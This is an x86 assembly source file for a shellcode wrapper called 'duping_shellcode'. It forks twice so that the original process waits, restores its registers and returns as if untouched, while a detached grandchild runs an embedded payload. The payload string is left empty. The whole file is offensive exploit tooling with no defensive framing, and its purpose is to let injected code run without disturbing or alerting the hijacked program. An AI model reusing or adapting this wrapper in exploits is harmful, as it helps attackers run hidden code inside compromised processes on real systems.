.globl duping_shellcode
duping_shellcode:

nop
nop
pusha
xor %eax,%eax
mov $0x02,%al  /* fork a CHILD*/
int $0x80
xor %ebx,%ebx
cmp %eax,%ebx
je child
father:       /* FATHER - wait child dead and return*/
xor %eax,%eax
mov $0x07,%al /* waitpid, wait for child dead */
int $0x80
popa          /* recover data from stack and return, previously saved */
ret
child:          /* CHILD */
xor %eax,%eax
mov $0x02,%al /* fork other CHILD (child2) */
int $0x80     
xor %ebx,%ebx
cmp %eax,%ebx
je child2
fatherchild:
xor %eax,%eax /* exit silently */
mov %eax,%ebx
mov $1,%al    /* sys_exit */
int $0x80     /* die in peace, poor child */

child2:	      /* CHILD2 EXECUTE SHELLCODE */ 
.string ""

